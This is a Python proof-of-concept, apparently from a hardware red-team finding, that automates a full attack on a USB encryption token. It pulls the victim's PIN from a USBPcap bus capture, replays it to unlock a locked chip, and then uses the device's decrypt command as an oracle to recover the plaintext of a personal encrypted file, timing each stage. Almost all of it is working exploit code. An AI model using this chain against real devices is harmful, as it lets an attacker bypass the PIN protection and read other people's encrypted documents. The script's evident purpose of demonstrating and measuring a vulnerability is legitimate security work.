"""F-003 additional [HW-NOW]: fully-automated capture->first-file-open pipeline + timing.
Given a USBPcap capture of a victim unlock, ZERO human interaction:
  (1) parse the PIN from the 0x08 report on the bus
  (2) replay 0x08 to unlock a LOCKED chip
  (3) 0x0E oracle -> full plaintext of a real .crin
Measures each stage. Answers: time from capture to first file open, and automatable?
Run against a LOCKED chip. Correct PIN (from the victim's own bus) => no attempt consumed."""
import hid, time
def be3(n): return bytes([(n>>16)&0xFF,(n>>8)&0xFF,n&0xFF])
OPEN=27; DATA=55; TAG=16; HDR=66
PCAP=r"C:\RedTeam\f003_capture.pcap"
TARGET=r"<HOME>\Desktop\cryptin\<documento personale>.pdf.crin"

t_start=time.perf_counter()
# (1) parse PIN from pcap
data=open(PCAP,"rb").read(); pin=None; i=0
while True:
    j=data.find(b"\x01\x08\x06",i)
    if j<0: break
    cand=data[j+3:j+9]
    if len(cand)==6 and all(0x30<=b<=0x39 for b in cand): pin=cand; break
    i=j+1
t_parse=time.perf_counter()-t_start
if pin is None: print("no PIN in pcap"); raise SystemExit(1)
print(f"(1) PIN parsed from bus capture: {pin.decode()!r}  ({t_parse*1e3:.1f} ms)")

d=hid.device(); d.open(0x303A,0x8123); d.set_nonblocking(True)
for _ in range(256):
    if not bytes(d.read(64)): break
d.set_nonblocking(False)
def send(op,arg=b''):
    d.write((bytes([1,op,len(arg)&0xFF])+arg).ljust(64,b'\x00'))
    for _ in range(8):
        r=bytes(d.read(64,timeout_ms=3000))
        if len(r)>=3 and r[1]==op: return r[2],r
    return (r[2] if len(r)>2 else None),r

pre=send(0x04)[0]
# (2) replay unlock
t=time.perf_counter(); su,_=send(0x08,pin); t_unlock=time.perf_counter()-t
print(f"(2) replay 0x08 -> 0x{su:02X} ({'UNLOCKED' if su==0 else 'FAIL'})  pre=0x{pre:02X}  ({t_unlock*1e3:.1f} ms)")
if su!=0: d.close(); raise SystemExit(1)
# (3) oracle decrypt
t=time.perf_counter()
blob=open(TARGET,"rb").read(); h=blob[:HDR]; salt=h[38:54]; nonce=h[54:66]; body=blob[HDR:]; ct=body[:-TAG]; tag=body[-TAG:]
ch=[]; off=0; f=min(OPEN,len(ct)); ch.append(ct[:f]); off=f
while off<len(ct): tt=min(DATA,len(ct)-off); ch.append(ct[off:off+tt]); off+=tt
tot=len(ch); plain=bytearray()
for s in range(tot):
    a=(be3(0)+be3(tot)+salt+nonce+ch[0]) if s==0 else be3(s)+be3(tot)+ch[s]
    st,r=send(0x0E,a)
    if st!=0: print(f"dec chunk{s}=0x{st:02X}"); d.close(); raise SystemExit(1)
    plain+=r[4:4+r[3]]
stg,_=send(0x0E,be3(tot)+be3(tot)+tag); t_dec=time.perf_counter()-t
total=time.perf_counter()-t_start
name=TARGET.split("\\")[-1]
print(f"(3) 0x0E oracle -> {len(plain)} bytes, magic={bytes(plain[:4]).hex(' ')}, tag={'VERIFIED' if stg==0 else '0x%02X'%stg}  ({t_dec:.2f} s)")
print(f"\n[TOTAL] capture-file -> full plaintext of {name}: {total:.2f} s, ZERO human interaction")
print(f"        breakdown: parse {t_parse*1e3:.0f}ms + unlock {t_unlock*1e3:.0f}ms + decrypt {t_dec:.2f}s")
d.close()
